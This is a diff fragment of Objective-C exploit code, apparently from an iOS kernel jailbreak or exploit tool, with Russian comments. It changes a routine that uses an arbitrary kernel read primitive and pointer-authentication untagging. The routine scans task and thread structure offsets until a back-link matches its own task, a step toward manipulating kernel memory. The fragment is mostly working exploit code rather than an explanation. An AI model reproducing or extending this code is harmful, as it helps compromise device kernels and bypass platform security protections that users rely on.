@@ -5073,20 +5073,19 @@ static void kpPacLive(NSString *line)
         // обратная ссылка thread→tro(+0x3E8)→tro_task(+0x28) должна == selfTask.
         // гонкам мутации очереди это безразлично.
         uint32_t taskQ = 0, linkQ = 0;
-        const uint32_t hcands[] = {0x50, 0x58};
-        const uint32_t lcands[] = {0x3c8, 0x3d0, 0x3d8, 0x3e0, 0x3b0, 0x3f0};
-        for (int h = 0; h < 2 && !taskQ; h++) {
-            uint64_t A = kp_untag_ptr(kp_rc_kread64(selfTask + hcands[h]));
-            pacnote([NSString stringWithFormat:@"  h=0x%x: A=%#llx", hcands[h], A]);
+        for (uint32_t h = 0x40; h <= 0xC0 && !taskQ; h += 8) {
+            uint64_t A = kp_untag_ptr(kp_rc_kread64(selfTask + h));
             if (!kpLooksLikeKernelPointer(A)) continue;
-            for (int l = 0; l < 6; l++) {
-                uint64_t thr = A - lcands[l];
+            pacnote([NSString stringWithFormat:@"  h=0x%x: A=%#llx", h, A]);
+            for (uint32_t l = 0x300; l <= 0x410; l += 8) {
+                uint64_t thr = A - l;
                 uint64_t tro2 = kp_untag_ptr(kp_rc_kread64(thr + 0x3E8));
+                if (!kpLooksLikeKernelPointer(tro2)) continue;
                 uint64_t tsk = kp_untag_ptr(kp_rc_kread64(tro2 + 0x28));
                 pacnote([NSString stringWithFormat:@"    l=0x%x: thr=%#llx tro=%#llx tsk=%#llx%@",
-                         lcands[l], thr, tro2, tsk, (tsk == selfTask) ? @" ← MATCH" : @""]);
+                         l, thr, tro2, tsk, (tsk == selfTask) ? @" ← MATCH" : @""]);
                 if (tsk == selfTask) {
-                    taskQ = hcands[h]; linkQ = lcands[l];
+                    taskQ = h; linkQ = l;
                     pacnote([NSString stringWithFormat:@"  ВАЛИДНО: task.threads=0x%x link=0x%x", taskQ, linkQ]);
                     break;
                 }
